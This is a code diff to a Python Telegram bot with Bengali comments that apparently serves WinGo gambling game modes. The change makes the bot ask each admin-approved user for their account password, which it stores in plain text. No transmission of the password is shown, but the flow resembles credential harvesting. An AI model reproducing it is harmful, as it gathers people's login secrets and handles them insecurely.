@@ -23,6 +23,7 @@ def get_state(uid):
             "logged_in": False,
             "awaiting": None,
             "phone": "",
+            "password": "",
             "game": None,
             "steps": [],
             "step_idx": 0,
@@ -57,8 +58,8 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = get_state(uid)
     
-    # যদি ইউজার ইতিমধ্যে লগইন করা থাকে, তাকে সরাসরি গেম সিলেকশন দেখাবে
-    if state["logged_in"]:
+    # যদি ইউজার ইতিমধ্যে লগইন এবং পাসওয়ার্ড দিয়ে সম্পূর্ণ রেডি থাকে
+    if state["logged_in"] and state.get("game"):
         keyboard = [
             [
                 InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
@@ -70,7 +71,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ],
         ]
         await update.message.reply_text(
-            "✅ আপনি ইতিমধ্যে অনুমোদিত আছেন!\n🎯 গেম সিলেক্ট করুন:",
+            "✅ আপনি ইতিমধ্যে লগইন করা আছেন!\n🎯 গেম সিলেক্ট করুন:",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup(keyboard),
         )
@@ -139,7 +140,36 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. গেমের স্টেপস সেট করা
+    # ২. অ্যাডমিন পারমিশন দেওয়ার পর ইউজার যখন পাসওয়ার্ড দেবে
+    if not state["logged_in"] and state.get("awaiting") == "password":
+        state["password"] = text
+        state["logged_in"] = True
+        state["awaiting"] = None
+
+        await update.message.reply_text(
+            "✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*",
+            parse_mode="Markdown"
+        )
+
+        # পাসওয়ার্ড পাওয়ার পর গেম সিলেকশন বাটন পাঠানো
+        keyboard = [
+            [
+                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
+                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
+            ],
+            [
+                InlineKeyboardButton("🕐 WinGo 3m", callback_data="game_3m"),
+                InlineKeyboardButton("🕔 WinGo 5m", callback_data="game_5m"),
+            ],
+        ]
+        await update.message.reply_text(
+            "🎯 গেম সিলেক্ট করুন:",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+        )
+        return
+
+    # ৩. গেমের স্টেপস সেট করা
     if state["logged_in"]:
         if state.get("awaiting") == "steps":
             try:
@@ -157,7 +187,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 )
             return
 
-        # ৩. টার্গেট প্রফিট সেট করা
+        # ৪. টার্গেট প্রফিট সেট করা
         if state.get("awaiting") == "target":
             try:
                 tgt = float(text)
@@ -196,43 +226,31 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         await query.message.reply_text(login_text, parse_mode="Markdown")
 
-    # অ্যাডমিন যখন যে কোনো ইউজারের APPROVE বাটনে চাপ দেবে
+    # অ্যাডমিন যখন APPROVE বাটনে চাপ দেবে
     elif data.startswith("approve_"):
         target_uid = int(data.split("_")[1])
         target_state = get_state(target_uid)
-        target_state["logged_in"] = True
-        target_state["awaiting"] = None
+        target_state["awaiting"] = "password"  # অ্যাপ্রুভ করার পর পাসওয়ার্ড চাইতে বলবে
 
-        # অ্যাডমিন চ্যাট আপডেট করা যাতে বোঝা যায় এটি অ্যাপ্রুভ হয়ে গেছে
+        # অ্যাডমিন চ্যাট আপডেট করা
         try:
             await query.edit_message_text(f"{query.message.text}\n\n✅ **APPROVED!**")
         except:
             pass
 
-        # নির্দিষ্ট ইউজারকে গেম সিলেকশন বাটন পাঠানো
-        keyboard = [
-            [
-                InlineKeyboardButton("🎮 WinGo 30s", callback_data="game_30s"),
-                InlineKeyboardButton("⏱️ WinGo 1m", callback_data="game_1m"),
-            ],
-            [
-                InlineKeyboardButton("🕐 WinGo 3m", callback_data="game_3m"),
-                InlineKeyboardButton("🕔 WinGo 5m", callback_data="game_5m"),
-            ],
-        ]
+        # নির্দিষ্ট ইউজারকে পাসওয়ার্ড চাওয়ার মেসেজ পাঠানো
         try:
             await ctx.bot.send_message(
                 chat_id=target_uid,
-                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n🎯 গেম সিলেক্ট করুন:",
+                text="✅ *ADMIN APPROVED YOUR ACCOUNT!*\n\n🔑 এখন আপনার একাউন্টের পাসওয়ার্ড দিন:",
                 parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup(keyboard),
             )
         except Exception as e:
             print(f"User notify error: {e}")
 
     elif data.startswith("game_"):
         if not state["logged_in"]:
-            await query.message.reply_text("❌ আগে লগইন করুন এবং অ্যাডমিনের অনুমোদনের অপেক্ষা করুন।")
+            await query.message.reply_text("❌ আগে লগইন করুন এবং পাসওয়ার্ড দিয়ে ভেরিফাই করুন।")
             return
         mode = data.split("_")[1]
         state["game"] = mode
